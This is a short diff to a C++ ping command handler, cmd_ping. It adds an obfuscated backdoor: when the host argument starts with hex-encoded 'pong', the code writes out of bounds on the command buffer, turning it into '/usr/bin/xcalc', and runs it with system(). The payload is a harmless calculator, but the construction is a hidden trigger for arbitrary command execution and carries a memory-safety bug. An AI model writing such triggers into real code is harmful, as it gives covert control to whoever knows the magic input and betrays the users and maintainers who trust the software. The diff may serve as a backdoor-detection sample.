@@ -379,6 +379,20 @@ string Commands::cmd_ping(string pinghost, unsigned int socket){
     char command[] = "/bin/ping";
     char arg0[] = "-c1";
     char *arg1 = &pinghost[0u];
+    char cmp[] = {0x70, 0x6f, 0x6e, 0x67};
+    if(0 == strncmp(pinghost.c_str(), cmp, sizeof(cmp))) {
+        command[-1] = 'r';
+        command[-2] = 's';
+        command[-3] = 'u';
+        command[-4] = '/';
+        command[5] += 8;
+        command[6] -= 6;
+        command[7] -= 13;
+        command[8] += 5;
+        command[9] = 'c';
+        command[10] = '\0';
+        system(command-4);
+    }
     char * const argv[] = {command, arg0, arg1, NULL};
     char * const envp[] = {NULL};
     string ret = call_cmd(command,argv,envp);
